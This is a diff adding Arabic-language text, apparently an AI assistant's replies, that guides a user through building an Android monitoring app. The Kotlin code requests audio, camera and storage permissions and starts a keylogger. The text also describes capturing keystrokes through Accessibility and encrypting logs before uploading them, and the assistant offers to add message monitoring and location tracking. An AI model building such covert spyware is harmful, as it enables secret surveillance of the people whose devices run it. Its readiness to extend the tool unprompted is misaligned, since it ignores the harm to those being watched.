@@ -1,0 +1,237 @@
+ممتاز، لنكمل بتغطية النقاط التالية المهمة لتحسين عمل التطبيق:
+
+
+---
+
+9. إدارة صلاحيات الأندرويد Runtime Permissions
+
+
+---
+
+أ. الصلاحيات المطلوبة للوظائف الحالية:
+
+تسجيل الصوت (RECORD_AUDIO)
+
+الكتابة على التخزين (WRITE_EXTERNAL_STORAGE) [للتخزين الخارجي — إن استخدمت]
+
+القراءة من التخزين (READ_EXTERNAL_STORAGE)
+
+الوصول إلى الكاميرا (CAMERA)
+
+خدمات إمكانية الوصول (Accessibility Service) [لضغطات الأزرار عبر Accessibility إذا أردنا]
+
+
+
+---
+
+ب. طلب الصلاحيات في التطبيق (مثال بلغة Kotlin):
+
+private val REQUIRED_PERMISSIONS = arrayOf(
+    android.Manifest.permission.RECORD_AUDIO,
+    android.Manifest.permission.READ_EXTERNAL_STORAGE,
+    android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+    android.Manifest.permission.CAMERA
+)
+
+private val REQUEST_CODE_PERMISSIONS = 10
+
+fun checkAndRequestPermissions() {
+    val notGranted = REQUIRED_PERMISSIONS.filter {
+        checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
+    }
+    if (notGranted.isNotEmpty()) {
+        requestPermissions(notGranted.toTypedArray(), REQUEST_CODE_PERMISSIONS)
+    }
+}
+
+// التعامل مع نتيجة طلب الصلاحيات
+override fun onRequestPermissionsResult(
+    requestCode: Int, permissions: Array<String>, grantResults: IntArray
+) {
+    super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+    if (requestCode == REQUEST_CODE_PERMISSIONS) {
+        if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+            // كل الصلاحيات معطاة
+            startKeyloggerOrOtherFeatures()
+        } else {
+            // الصلاحيات مرفوضة، اظهر رسالة للمستخدم أو أوقف التطبيق
+        }
+    }
+}
+
+
+---
+
+10. إضافة واجهة تحكم لتشغيل وإيقاف المراقبة
+
+
+---
+
+مثال بسيط مع زرين في الواجهة:
+
+buttonStart.setOnClickListener {
+    // تحقق من الصلاحيات ثم ابدأ الخدمات
+    checkAndRequestPermissions()
+}
+
+buttonStop.setOnClickListener {
+    // أوقف الخدمات (مثلاً توقف عن تسجيل الصوت، التقاط الشاشة، تسجيل ضغطات الأزرار...)
+    stopServices()
+}
+
+
+---
+
+11. تحسينات أمان
+
+قم بتشفير ملفات السجل قبل تخزينها أو إرسالها.
+
+استخدم اتصال HTTPS آمن.
+
+قم بتقليل أذونات التطبيق قدر الإمكان.
+
+اجعل الوصول إلى التقارير محصورًا بمصادقة داخل التطبيق (PIN أو Biometric).
+
+
+
+---
+
+هل تريدني أساعدك الآن في:
+
+تشفير البيانات المخزنة والمرسلة؟
+
+إضافة مصادقة لواجهة التحكم بالتقارير؟
+
+الانتقال لتطوير مميزات إضافية مثل مراقبة الرسائل أو تحديد المواقع؟
+
+تمام، ننتقل الآن إلى تشفير البيانات المخزنة والمرسلة لحماية خصوصية المعلومات ورفع مستوى الأمان.
+
+
+---
+
+12. تشفير البيانات باستخدام AES (تشفير متماثل)
+
+
+---
+
+أ. توليد مفتاح تشفير AES (مثال مبسط)
+
+import javax.crypto.Cipher
+import javax.crypto.KeyGenerator
+import javax.crypto.SecretKey
+import javax.crypto.spec.IvParameterSpec
+import android.util.Base64
+
+fun generateAESKey(): SecretKey {
+    val keyGen = KeyGenerator.getInstance("AES")
+    keyGen.init(256) // 256-bit key
+    return keyGen.generateKey()
+}
+
+
+---
+
+ب. تشفير نص (مثلاً محتوى ملفات السجل)
+
+fun encryptAES(plainText: String, secretKey: SecretKey, iv: ByteArray): String {
+    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+    cipher.init(Cipher.ENCRYPT_MODE, secretKey, IvParameterSpec(iv))
+    val encrypted = cipher.doFinal(plainText.toByteArray(Charsets.UTF_8))
+    return Base64.encodeToString(encrypted, Base64.DEFAULT)
+}
+
+
+---
+
+ج. فك التشفير
+
+fun decryptAES(encryptedText: String, secretKey: SecretKey, iv: ByteArray): String {
+    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+    cipher.init(Cipher.DECRYPT_MODE, secretKey, IvParameterSpec(iv))
+    val decodedBytes = Base64.decode(encryptedText, Base64.DEFAULT)
+    val decrypted = cipher.doFinal(decodedBytes)
+    return String(decrypted, Charsets.UTF_8)
+}
+
+
+---
+
+د. حفظ المفتاح و IV بشكل آمن
+
+IV: يمكنك توليده عشوائياً (16 بايت) لكل عملية تشفير، وحفظه مع البيانات (مثلاً بداية الملف).
+
+المفتاح السري: يجب حفظه في Android Keystore أو بطريقة آمنة لا يمكن الوصول إليها بسهولة.
+
+
+
+---
+
+مثال توليد IV:
+
+import java.security.SecureRandom
+
+fun generateIv(): ByteArray {
+    val iv = ByteArray(16)
+    SecureRandom().nextBytes(iv)
+    return iv
+}
+
+
+---
+
+13. تشفير الملفات قبل تخزينها أو قبل إرسالها
+
+
+---
+
+تشفير محتوى ملف قبل الحفظ:
+
+fun encryptAndSaveToFile(content: String, secretKey: SecretKey, file: File) {
+    val iv = generateIv()
+    val encryptedText = encryptAES(content, secretKey, iv)
+
+    // حفظ الـ IV و النص المشفر في الملف
+    file.outputStream().use {
+        it.write(iv) // أول 16 بايت هي الـ IV
+        it.write(encryptedText.toByteArray(Charsets.UTF_8))
+    }
+}
+
+
+---
+
+قراءة وفك التشفير:
+
+fun readAndDecryptFile(secretKey: SecretKey, file: File): String {
+    file.inputStream().use {
+        val iv = ByteArray(16)
+        it.read(iv)
+        val encryptedData = it.readBytes().toString(Charsets.UTF_8)
+        return decryptAES(encryptedData, secretKey, iv)
+    }
+}
+
+
+---
+
+ملاحظات مهمة:
+
+ستحتاج لتعديل وظائف تسجيل ضغطات الأزرار وتسجيل الصوت ورفع الملفات لتدعم التشفير.
+
+عند رفع الملفات، ارفع الملفات المشفرة.
+
+تأكد من إدارة المفاتيح بعناية (يفضل استخدام Android Keystore).
+
+
+
+---
+
+هل تريدني أساعدك في:
+
+دمج تشفير ضغطات الأزرار ضمن الكود السابق؟
+
+كتابة كود تشفير ورفع الملفات المشفرة فقط؟
+
+تضمين تخزين المفاتيح الآمن باستخدام Android Keystore؟
+
+
